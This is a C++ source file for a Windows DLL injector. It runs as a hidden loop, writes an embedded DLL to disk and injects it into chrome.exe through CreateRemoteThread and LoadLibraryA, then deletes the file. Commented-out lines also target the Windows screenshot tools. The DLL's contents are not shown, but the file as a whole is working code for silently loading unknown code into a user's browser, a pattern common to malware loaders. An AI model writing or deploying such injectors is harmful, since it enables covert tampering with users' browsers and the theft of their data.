#include "utils.h"
#include "dllResource.h"
#include <iostream>

bool IsInjected = false;

int inject(const wchar_t* processname) {

	uint32_t processID = 0;

	processID = utils::GetProcessIDByProcessName(processname);

	if (processID == 0) {
		IsInjected = false;
		return -1;
	}
	if (!IsInjected) {
		HANDLE ChromeProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processID);

		if (ChromeProcess == INVALID_HANDLE_VALUE) {
			return -1;
		}

		std::wstring pathW = utils::GetDllPath();
		if (!utils::DropFileFromBuffer(pathW, (const char*)dllResource::Resource, sizeof(dllResource::Resource))) {
			CloseHandle(ChromeProcess);
			return -1;
		}

		std::string path(pathW.begin(), pathW.end());

		LPVOID PathAddress = VirtualAllocEx(ChromeProcess, NULL, strlen(path.c_str()) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (PathAddress == nullptr) {
			return -1;
		}

		if (!WriteProcessMemory(ChromeProcess, PathAddress, path.c_str(), strlen(path.c_str()) + 1, NULL)) {
			return -1;
		}

		HMODULE Kernel32DLL = GetModuleHandleA("kernel32.dll");

		if (Kernel32DLL == INVALID_HANDLE_VALUE || Kernel32DLL == NULL) {
			return -1;
		}

		FARPROC LoadLibraryA_Address = GetProcAddress(Kernel32DLL, "LoadLibraryA");

		if (LoadLibraryA_Address == NULL) {
			return -1;
		}

		HANDLE ChromeRemoteThread = CreateRemoteThread(ChromeProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA_Address, PathAddress, 0, NULL);

		if (ChromeRemoteThread == INVALID_HANDLE_VALUE || ChromeRemoteThread == 0) {
			return -1;
		}

		WaitForSingleObject(ChromeRemoteThread, INFINITE);
		CloseHandle(ChromeRemoteThread);
		CloseHandle(ChromeProcess);

		IsInjected = true;
		_wremove(utils::GetDllPath().c_str());
		return 0;
	}
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	while (true) {
		inject(L"chrome.exe");
		//inject(L"ScreenClippingHost.exe");
		//inject(L"SnippingTool.exe");
	}
	
}